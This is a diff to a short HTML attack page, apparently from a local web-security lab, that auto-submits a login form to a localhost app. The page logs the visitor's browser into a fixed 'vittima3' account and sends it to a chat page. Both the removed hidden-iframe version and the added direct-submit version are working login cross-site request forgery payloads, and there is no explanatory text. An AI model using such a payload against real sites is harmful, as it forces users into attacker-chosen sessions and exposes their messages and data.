@@ -2,19 +2,13 @@
 <html>
 <body>
 <div class="message">x</div>
-<iframe name="f" style="display:none"></iframe>
 <script>
-var f1 = document.createElement('form');
-f1.method = 'POST';
-f1.action = 'http://localhost/login';
-f1.target = 'f';
-f1.innerHTML = '<input name="username" value="vittima3"><input name="password" value="vittima3">';
-document.body.appendChild(f1);
-f1.submit();
-
-setTimeout(function(){
-  window.location = 'http://localhost/chat/70';
-}, 3000);
+var f = document.createElement('form');
+f.method = 'POST';
+f.action = 'http://localhost/login?next=/chat/70';
+f.innerHTML = '<input name="username" value="vittima3"><input name="password" value="vittima3">';
+document.body.appendChild(f);
+f.submit();
 </script>
 </body>
 </html>
